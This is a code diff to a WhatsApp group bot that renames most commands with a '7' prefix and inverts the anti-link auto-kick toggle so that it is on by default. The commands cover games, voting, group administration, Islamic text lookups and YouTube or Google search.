@@ -302,7 +302,7 @@ if (body.length > 50000)  {
 	  }  
 	
 	  //ANTI LINK GC IN GROUP === AUTO KICK 
-	if (isAntiLink) 
+	if (!isAntiLink) 
 	if (m.isGroup) 
 if (budy.includes('chat.whatsapp.com')) {
                if (!m.key.fromMe) {
@@ -649,14 +649,14 @@ In ${clockString(new Date - user.afkTime)}
         }
 	    
         switch(command) {
-	    case 'afk': {
+	    case '7afk': {
                 let user = global.db.users[m.sender]
                 user.afkTime = + new Date
                 user.afkReason = text
                 reply(`${m.pushName} Already Afk${text ? ': ' + text : ''}`)
             }
             break	
-        case 'ttc': case 'ttt': case 'tictactoe': {
+        case '7ttc': case '7ttt': case '7tictactoe': {
             let TicTacToe = require("./lib/tictactoe")
             this.game = this.game ? this.game : {}
             if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'You are still in the game'
@@ -706,7 +706,7 @@ Type *give up* to surrender and admit defeat`
             }
             }
             break
-            case 'delttc': case 'delttt': {
+            case '7delttc': case '7delttt': {
             this.game = this.game ? this.game : {}
             try {
             if (this.game) {
@@ -720,7 +720,7 @@ Type *give up* to surrender and admit defeat`
             }
             }
             break
-            case 'suitpvp': case 'suit': {
+            case '7suitpvp': case '7suit': {
             this.suit = this.suit ? this.suit : {}
             let poin = 10
             let poin_lose = 10
@@ -749,7 +749,7 @@ Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
             }
             break
 	    
-case 'donasi': case 'donate': {
+case '7donasi': case '7donate': {
 	don = fs.readFileSync('./BotMedia/donasi.jpg')
 let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: '👤OWNER BOT👤'}, type: 1}
@@ -764,7 +764,7 @@ let buttons = [
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
        }
           break
-case 'sewa': case 'sewabot': case 'botsewa': {
+case '7sewa': case '7sewabot': case '7botsewa': {
 	don = fs.readFileSync('./BotMedia/sewa.jpg')
 let buttons = [
                     {buttonId: `${prefix}owner`, buttonText: {displayText: '👤OWNER BOT👤'}, type: 1}
@@ -779,12 +779,12 @@ let buttons = [
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
        }
           break
-case 'sc': case 'script': case 'scbot': case 'scriptbot': 
+case '7sc': case '7script': case '7scbot': case '7scriptbot': 
 reply(global.script)
           break
             
             
-case 'chat404': case 'cet404': {
+case '7chat404': case '7cet404': {
 let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                 listMessage :{
                     title: `Hai ${pushname}`,
@@ -839,7 +839,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
             XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
             }
             break
-            case '404setchat': {
+            case '7404setchat': {
                // if (!isCreator) throw mess.owner
                 if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                 if (args[0] === 'mute') {
@@ -859,7 +859,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
                 }
             }
             break
-	    case 'family100hdiejebdjdijdjdjdj': { //this is in indonesian so if u want to activate u can but will be in indonesian
+	    case '7family100hdiejebdjdijdjdjdj': { //this is in indonesian so if u want to activate u can but will be in indonesian
                 if ('family100'+m.chat in _family100) {
                     reply('There are still unfinished sessions!')
                     throw false
@@ -876,13 +876,13 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
                 }
             }
             break
-            case 'halah': case 'hilih': case 'heleh': case 'huluh': case 'holoh': //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
+            case '7halah': case '7hilih': case '7heleh': case '7huluh': case '7holoh': //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
             if (!m.quoted && !text) throw `Send/reply text with caption ${prefix + command}`
             ter = command[1].toLowerCase()
             tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
             reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
             break
-case 'todi': case 'hilihdkksls': case 'huluhkdksls': case 'helehkdkdkd': case 'holohkdkskks': //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
+case '7todi': case '7hilihdkksls': case '7huluhkdksls': case '7helehkdkdkd': case '7holohkdkskks': //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
             if (!m.quoted && !text) throw `Send/reply text with caption ${prefix + command}`
             ter = command[1].toLowerCase()
             tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
@@ -896,7 +896,7 @@ ${tex}
 XeonBotInc.sendMessage(m.chat, { text: teksnya, contextInfo: { mentionedJid: [users] }}, { quoted: m})
 
             break
-            case 'tebak': { //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
+            case '7tebak': { //this is in indonesian so if u want to activate u can but will be in indonesian (thanks to respected creator of this case)
                 if (!text) {
                 	let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                 listMessage :{
@@ -1035,7 +1035,7 @@ XeonBotInc.sendMessage(m.chat, { text: teksnya, contextInfo: { mentionedJid: [us
                 }
             }
             break
-            case 'mathquiz': case 'math': {
+            case '7mathquiz': case '7math': {
                 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
                 let { genMath, modes } = require('./src/math')
                 if (!text) {
@@ -1104,7 +1104,7 @@ XeonBotInc.sendMessage(m.chat, { text: teksnya, contextInfo: { mentionedJid: [us
                 }
             }
             break
-            case 'mysoulmate': case 'pasanganku': {
+            case '7mysoulmate': case '7pasanganku': {
             if (!m.isGroup) throw mess.group
             let member = participants.map(u => u.id)
             let me = m.sender
@@ -1119,7 +1119,7 @@ XeonBotInc.sendMessage(m.chat, { text: teksnya, contextInfo: { mentionedJid: [us
                     await XeonBotInc.sendButtonText(m.chat, buttons, jawab,  `${global.fake}`, m, {mentions: ments})
             }
             break
-            case 'couple': {
+            case '7couple': {
             if (!m.isGroup) throw mess.group
             let member = participants.map(u => u.id)
             let orang = member[Math.floor(Math.random() * member.length)]
@@ -1133,7 +1133,7 @@ Ciee Whats Going On💖👀`
                     await XeonBotInc.sendButtonText(m.chat, buttons, jawab,  `${global.fake}`, m, {mentions: menst})
             }
             break
-            case 'join': {
+            case '7join': {
                 if (!isCreator) throw mess.owner
                 if (!text) throw 'Enter the group link!'
                 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
@@ -1142,12 +1142,12 @@ Ciee Whats Going On💖👀`
                 await XeonBotInc.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
             }
             break
-            case 'leave': case 'out': {
+            case '7leave': case '7out': {
                 if (!isCreator) throw mess.owner
                 await XeonBotInc.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
             }
             break
-	case 'kick': {
+	case '7kick': {
 		if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -1172,7 +1172,7 @@ case 'adduser': {
 		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 	}
 	break
-	case 'promote': {
+	case '7promote': {
 		if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -1180,7 +1180,7 @@ case 'adduser': {
 		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 	}
 	break
-	case 'demote': {
+	case '7demote': {
 		if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -1188,7 +1188,7 @@ case 'adduser': {
 		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 	}
 	break
-        case 'block': {
+        case '7block': {
 		if (!isCreator) throw mess.owner
 		if (!text && !m.quoted) throw `*Mana nomor yang mau di blockir?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
@@ -1197,7 +1197,7 @@ await XeonBotInc.updateBlockStatus(users, 'block') //.then((res) => reply(jsonfo
 	
 }
 	break
-        case 'unblock': {
+        case '7unblock': {
 		if (!isCreator) throw mess.owner
 		if (!text && !m.quoted) throw `*Mana nomor yang mau di Unblockir?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
@@ -1205,7 +1205,7 @@ reply(mess.success)
 		await XeonBotInc.updateBlockStatus(users, 'unblock') // .then((res) => reply(mess.done)).catch((err) => reply(mess.done))
 	
 }
-case 'unblockuser': {
+case '7unblockuser': {
 		if (!isCreator) throw mess.owner
 		//if (!text && !m.quoted) throw `*Mana nomor yang mau di Unblockir?*\n_Contoh:_ ${prefix + command} ${global.pemilik}`
 //let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
@@ -1214,7 +1214,7 @@ reply(mess.success)
 	XeonBotInc.sendMessage(`${text}`, { text: `Owner telah membuka blokir Anda dari BOT,gunakan bot dengan wajar dan jangan melakukan pelanggan terhadap peraturan pengguna`}, { quoted: m})
 }
 	break
-	    case 'setname': case 'setsubject': {
+	    case '7setname': case '7setsubject': {
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -1222,7 +1222,7 @@ reply(mess.success)
                 await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
             }
             break
-          case 'setdesc': case 'setdesk': {
+          case '7setdesc': case '7setdesk': {
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -1230,7 +1230,7 @@ reply(mess.success)
                 await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
             }
             break
-          case 'setppbot': case 'setbotpp': {
+          case '7setppbot': case '7setbotpp': {
                 if (!isCreator) throw mess.owner
                 if (!quoted) throw `Send/Reply Image Dengan Caption ${prefix + command}`
                 if (!/image/.test(mime)) throw `Send/Reply Image Dengan Caption ${prefix + command}`
@@ -1240,7 +1240,7 @@ reply(mess.success)
                 reply(mess.success)
                 }
                 break
-           case 'setppgroup': case 'setgrouppp': case 'setgcpp': case 'setppgrup': case 'setppgc': {
+           case '7setppgroup': case '7setgrouppp': case '7setgcpp': case '7setppgrup': case '7setppgc': {
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -1252,7 +1252,7 @@ reply(mess.success)
                 reply(mess.success)
                 }
                 break
-case 'grupinfo': case 'groupinfo':
+case '7grupinfo': case '7groupinfo':
 try{
  var pic = await XeonBotInc.getProfilePicture(m.chat)
   } catch {
@@ -1262,7 +1262,7 @@ let ingfo = `*G R O U P  I N F O*\n\n*Name :* ${groupName}\n*ID Group :* ${m.cha
 ds = await getBuffer(pic)
 XeonBotInc.sendMessage(m.chat, { image: ds,caption: ingfo, mentions: [groupMetadata.owner] }, { quoted: m})
 break
-            case 'tagall': case 'tag': {
+            case '7tagall': case '7tag': {
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -1275,14 +1275,14 @@ let teks = `══✪〘 *👥 Tag All* 〙✪══
                 XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                 }
                 break
-                case 'hidetag': {
+                case '7hidetag': {
             if (!m.isGroup) throw mess.group
             
             XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)})
             }
             break
 
-	    case 'style': case 'styletext': {
+	    case '7style': case '7styletext': {
 	      //  if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // response when limit runs out
 		//db.users[m.sender].limit -= 1 // -1 limit
 		let { styletext } = require('./lib/scraper')
@@ -1295,7 +1295,7 @@ let teks = `══✪〘 *👥 Tag All* 〙✪══
                 reply(teks)
 	    }
 	    break
-               case 'voting': case 'vote': {
+               case '7voting': case '7vote': {
             if (!m.isGroup) throw mess.group
             if (m.chat in vote) throw `_Vote masih berlangsung di group ini !_\n\n*${prefix}deletevote* - untuk menghapus vote`
             if (!text) throw `*Apa yang mau di vote?*\n_Contoh:_ ${prefix + command} ${global.pengguna} maju jadi presiden Indonesia`
@@ -1337,7 +1337,7 @@ let buttonsVote = [
             XeonBotInc.sendMessage(m.chat, buttonMessageVote)
 	    }
             break
-               case 'upvote': {
+               case '7upvote': {
             if (!m.isGroup) throw mess.group
             if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*Type ${prefix}vote* - untuk memulai voting`
             isVote = vote[m.chat][1].concat(vote[m.chat][2])
@@ -1379,7 +1379,7 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
             XeonBotInc.sendMessage(m.chat, buttonMessageUpvote)
 	    }
              break
-                case 'devote': {
+                case '7devote': {
             if (!m.isGroup) throw mess.group
             if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - untuk memulai voting`
             isVote = vote[m.chat][1].concat(vote[m.chat][2])
@@ -1422,7 +1422,7 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 	}
             break
                  
-case 'cekvote':
+case '7cekvote':
 if (!m.isGroup) throw mess.group
 if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - untuk memulai voting`
 teks_vote = `*「 VOTE 」*
@@ -1450,7 +1450,7 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 `
 XeonBotInc.sendTextWithMentions(m.chat, teks_vote, m)
 break
-		case 'deletevote': case 'delvote': case 'hapusvote': {
+		case '7deletevote': case '7delvote': case '7hapusvote': {
             if (!m.isGroup) throw mess.group
             if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai voting`
             delete vote[m.chat]
@@ -1577,18 +1577,19 @@ case 'antilink':
 	        if (!m.isGroup) return reply(`This feature only be used in group`)
 			if (!isAdmins) return reply(`This feature could be used by admin only`)
 			if (!isBotAdmins) return reply(`Bot must be admin first`)
-					if (args[0] === 'on') {
-						if (isAntiLink) return reply('Already Activated')
+					if (args[0] === 'off') {
+						if (isAntiLink) return reply('Already Deactivated') 
 						antilink.push(m.chat)
 						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
-						reply('Successfully activated the antilink feature')
-						XeonBotInc.sendMessage(m.chat,  {text: `ALLERT!!! This group has been installed anti-link\nIf you violate then I will kick`})
-					} else if (args[0] === 'off') {
-						if (!isAntiLink) return reply('Already Deactivated')
+						reply('Successfully disabled antilink feature')
+						
+					} else if (args[0] === 'on') {
+						if (!isAntiLink) return reply('Already Activated')
 						var ini = antilink.indexOf(m.chat)
 						antilink.splice(ini, 1)
 						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
-						reply('Successfully disabled antilink feature')
+						reply('Successfully activated the antilink feature')
+						XeonBotInc.sendMessage(m.chat,  {text: `ALLERT!!! This group has been installed anti-link\nIf you violate then I will kick`})
 					} else if (!q){
  let buttons = [
                      {buttonId: `${prefix + command} on`, buttonText: {displayText: 'ON❗'}, type: 1},
@@ -1664,7 +1665,7 @@ case 'antilink':
             }
 					break 
 					
-					   case 'mute': {
+					   case '7mute': {
                 if (!m.isGroup) throw mess.group
                 if (!isAdmins) throw mess.admin
                 if (args[0] === "on") {
@@ -1684,14 +1685,14 @@ case 'antilink':
                 }
              }
              break
-            case 'linkgroup': case 'grouplink': case 'gclink': case 'linkgc': {            
+            case 'linkgroup': case '7grouplink': case '7gclink': case '7linkgc': {            
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) return reply(`Bot must be admin first`)
                 let response = await XeonBotInc.groupInviteCode(m.chat)
                 XeonBotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink of: ${groupMetadata.subject} Group`, m, { detectLink: true })
             }
             break
-            case 'ephemeral': {
+            case '7ephemeral': {
                 if (!m.isGroup) throw mess.group
                 if (!isBotAdmins) throw mess.botAdmin
                 if (!isAdmins) throw mess.admin
@@ -1755,7 +1756,7 @@ case 'antilink':
                 reply(`Successful Sending Broadcast To ${anu.length} Group(s)`)
             }
             break
-            case 'bc': case 'broadcast': case 'bcall': {
+            case '7bc': case '7broadcast': case '7bcall': {
                 if (!isCreator) throw mess.owner
                 if (!text) throw `*Mana teks nya?*\n\_Contoh:_ ${prefix + command} Hello guys im WhatsApp bot in here`
                 let anu = await store.chats.all().map(v => v.id)
@@ -1796,7 +1797,7 @@ case 'antilink':
             }
             break
 
-            case 'chatinfo': {
+            case '7chatinfo': {
                 if (!m.quoted) reply('Reply to mesaage')
                 let msg = await m.getQuotedObj()
                 if (!m.quoted.isBaileys) throw 'The message was not sent by a bot!'
@@ -1811,14 +1812,14 @@ case 'antilink':
                 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
-            case 'q': case 'quoted': {
+            case '7q': case '7quoted': {
 		if (!m.quoted) return reply('Reply Message!!')
 		let wokwol = await XeonBotInc.serializeM(await m.getQuotedObj())
 		if (!wokwol.quoted) return reply('The message you replied to does not contain a reply')
 		await wokwol.quoted.copyNForward(m.chat, true)
             }
 	    break
-            case 'listpc': {
+            case '7listpc': {
                  let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                  let teks = `⬣ *PERSONAL CHAT LIST*\n\nTotal Chat : ${anu.length} Chat\n\n`
                  for (let i of anu) {
@@ -1828,7 +1829,7 @@ case 'antilink':
                  XeonBotInc.sendTextWithMentions(m.chat, teks, m)
              }
              break
-                case 'listgc': {
+                case '7listgc': {
                  let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                  let teks = `⬣ *GROUP CHAT LIST*\n\nTotal Group : ${anu.length} Group\n\n`
                  for (let i of anu) {
@@ -1838,14 +1839,14 @@ case 'antilink':
                  XeonBotInc.sendTextWithMentions(m.chat, teks, m)
              }
              break
-             case 'listonline': case 'onlinelist': case 'liston': {
+             case '7listonline': case '7onlinelist': case '7liston': {
                     let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                     let online = [...Object.keys(store.presences[id]), botNumber]
                     XeonBotInc.sendText(m.chat, 'Online List:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
              }
              break
 //[ Islam MENU]\\ apikey lolhuman
-         case 'listsurah': case 'listsurat': case 'surahlist':
+         case '7listsurah': case '7listsurat': case '7surahlist':
                     get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${global.apilol}`)
                     get_result = get_result.result
                     ini_txt = 'List Surah:\n'
@@ -1854,7 +1855,7 @@ case 'antilink':
                     }
                     m.reply(ini_txt)
                     break                                
-case 'alquran': {
+case '7alquran': {
 let buttons = [
                      {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                 ]
@@ -1888,7 +1889,7 @@ let buttons = [
                     }
                     }
                     break
-case 'alquranmp3': case 'alquranaudio': {
+case '7alquranmp3': case '7alquranaudio': {
 	let buttons = [
                      {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                 ]
@@ -1907,7 +1908,7 @@ XeonBotInc.sendMessage(m.chat, { audio: { url : links }, mimetype: 'audio/mpeg'}
 }
 }
 break
-case 'surahmp3': case 'surahaudio': {
+case '7surahmp3': case '7surahaudio': {
 	let buttons = [
                      {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                 ]
@@ -1926,7 +1927,7 @@ XeonBotInc.sendMessage(m.chat, { audio: { url : links }, mimetype: 'audio/mpeg'}
 }
 }
 break
-case 'ayatmp3': case 'ayataudio': {
+case '7ayatmp3': case '7ayataudio': {
 	let buttons = [
                      {buttonId: `${prefix}listsurah`, buttonText: {displayText: '📋LIST NOMOR SURAH📋'}, type: 1}             
                 ]
@@ -1946,7 +1947,7 @@ XeonBotInc.sendMessage(m.chat, { audio: { url : links }, mimetype: 'audio/mpeg'}
 }
 break
 
-         case 'jadwalsholat':
+         case '7jadwalsholat':
                     if (!text) throw `*Masukan nama kabupaten/kota?*\n_Contoh :_ ${prefix + command} madiun`
                     daerah = args.join(" ")
 get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${global.apilol}`)
@@ -1965,7 +1966,7 @@ get_result = await fetchJson(`http://api.lolhuman.xyz/api/sholat/${daerah}?apike
                     replay(ini_txt)
                     break  
                     
-             case 'hadits': case 'hadith': case 'hadist': {
+             case '7hadits': case '7hadith': case '7hadist': {
 		if (!args[0]) throw `*Masukan hadist NomorHadits*
 _Contoh:_
 ${prefix + command} bukhari 1
@@ -2038,7 +2039,7 @@ ${id}`)
 		}
 		}
 		break
-case 'niatsholat': case 'niatshalat': case 'niatsalat': case 'sholatniat': {
+case '7niatsholat': case '7niatshalat': case '7niatsalat': case '7sholatniat': {
 let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                 listMessage :{
                     title: `Hai ${pushname}`,
@@ -2083,7 +2084,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
             XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
             }
             break
-        case 'niat2': {
+        case '7niat2': {
         if (!text) throw `*Niat shalat apa?*\n_Contoh :_ ${prefix + command} subuh`
         	let res = await fetchJson(`https://api.lolhuman.xyz/api/niatsholat/${text}?apikey=${global.apilol}`)
         replay(`*〔 ${res.result.name} 〕*
@@ -2094,7 +2095,7 @@ ${res.result.latin}
 ${res.result.id}`)
 }
 break
-case 'maghrib': {
+case '7maghrib': {
         	
         replay(`*〔 Niat Sholat Maghrib 〕*
 أُصَلِّى فَرْضَ المَغْرِبِ ثَلاَثَ رَكَعاَتٍ مُسْتَقْبِلَ الْقِبْلَةِ أَدَاءً لله تَعَالَى.
@@ -2104,7 +2105,7 @@ Ushallii fardhal maghribi tsalaatsa raka’aatin mustaqbilal qiblati adaa’an l
 "Saya (berniat) mengerjakan sholat fardhu maghrib tiga raka’at dengan menghadap kiblat karena Allah Ta’ala."`)
 }
 break
-case 'asmaulhusna': {
+case '7asmaulhusna': {
  	let anu = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${global.apilol}`)
      let buttons = [
                      {buttonId: `${prefix + command}`, buttonText: {displayText: '➡️Next➡️'}, type: 1},
@@ -2131,7 +2132,7 @@ case 'asmaulhusna': {
             XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-case 'kisah2': case 'kisahnabi2': {
+case '7kisah2': case '7kisahnabi2': {
                 if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                     query = args.join(" ")
                     getresult = await fetchJson(`http://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${global.apilol}`)
@@ -2144,7 +2145,7 @@ case 'kisah2': case 'kisahnabi2': {
                     replay(ini_txt)
                     }
                     break
-case 'kisahnabi': case 'kisahrasul': case 'rasulkisah': case 'nabikisah': {
+case '7kisahnabi': case '7kisahrasul': case '7rasulkisah': case '7nabikisah': {
 	//if (!text) throw `*Masukan Teks*\n_Contoh:_ ${prefix + command} dasar anak tiktok suka pargoy di tempat umum`
 let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                 listMessage :{
@@ -2292,7 +2293,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
             break
 
 //[ DOWNLOAD MENU SEARCH MENU]\\ No Apikey
-	    case 'yts': case 'ytsearch': {
+	    case '7yts': case '7ytsearch': {
                 if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} Story WA Anime`
                 let yts = require("yt-search")
                 let search = await yts(text)
@@ -2304,7 +2305,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
                 XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
             }
             break
-         case 'gugel': case 'google': {
+         case '7gugel': case '7google': {
                 if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} Presiden pertama Indonesia`
                 let google = require('google-it')
                 google({'query': text}).then(res => {
@@ -2318,7 +2319,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
                 })
                 }
                 break
-        case 'gimage': case 'googleimage': {
+        case '7gimage': case '7googleimage': {
         if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} Soekarno`
         let gis = require('g-i-s')
         gis(text, async (error, result) => {
@@ -2340,7 +2341,7 @@ let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObje
         })
         }
         break
-	    case 'play': case 'ytplay': {
+	    case '7play': case '7ytplay': {
                 if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} DJ love story`
                 let yts = require("yt-search")
                 let search = await yts(text)
@@ -2384,7 +2385,7 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
                   XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
             }
             break
-	    case 'ytmp3': case 'ytaudio': {
+	    case '7ytmp3': case '7ytaudio': {
                 let { yta } = require('./lib/y2mate')
                 if (!text) throw `*Masukan Link YouTube*\n_Contoh :_ ${prefix + command} https://youtube.com/shorts/6853iqLNWKA`
                 let quality = args[1] ? args[1] : '320kbps'
@@ -2399,7 +2400,7 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
                 XeonBotInc.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
             }
             break
-            case 'ytmp4': case 'ytvideo': {
+            case '7ytmp4': case '7ytvideo': {
                 let { ytv } = require('./lib/y2mate')
                 if (!text) throw `*Masukan Link YouTube*\n_Contoh :_ ${prefix + command} https://youtube.com/shorts/6853iqLNWKA`
                 let quality = args[1] ? args[1] : '360p'
@@ -2413,7 +2414,7 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
 *⭔ Resololution :* ${args[1] || '360p'}` }, { quoted: m })
             }
             break
-	    case 'getmusic': {
+	    case '7getmusic': {
                 let { yta } = require('./lib/y2mate')
                 if (!text) throw `*Reply pesan bot (List Result yt search)* , dengan caption : ${prefix + command} <nomor list>\n\n*_Contoh :_* ${prefix + command} 1`
                 if (!m.quoted) return reply('Reply Pesan (List yt search yang dikirim oleh Bot) ')
@@ -2427,7 +2428,7 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
                 XeonBotInc.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
             }
             break
-            case 'getvideo': {
+            case '7getvideo': {
                 let { ytv } = require('./lib/y2mate')
                 if (!text) throw `*Reply pesan bot (List Result yt search)* , dengan caption : ${prefix + command} <nomor list>\n\n*_Contoh :_* ${prefix + command} 3 `
                 if (!m.quoted) return reply('Reply Pesan (List yt search yang dikirim oleh Bot) ')
@@ -2440,7 +2441,7 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
                 XeonBotInc.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolution : ${args[1] || '360p'}` }, { quoted: m })
             }
             break
-            case 'pinterest': {
+            case '7pinterest': {
             	
                 replay(mess.wait)
 		let { pinterest } = require('./lib/scraper')
@@ -2462,7 +2463,7 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
             }
             break
             
-	    case 'couplepp': case 'ppcouple': {
+	    case '7couplepp': case '7ppcouple': {
                 replay(mess.wait)
                 let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                 let random = anu[Math.floor(Math.random() * anu.length)]
@@ -2470,7 +2471,7 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
                 XeonBotInc.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
             }
 	    break
-            case 'coffee': case 'kopi': {
+            case '7coffee': case '7kopi': {
             let buttons = [
                     {buttonId: `${prefix}coffe`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                 ]
@@ -2484,7 +2485,7 @@ message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { uplo
                 XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
             }
             break
-            case 'wallpaper': {
+            case '7wallpaper': {
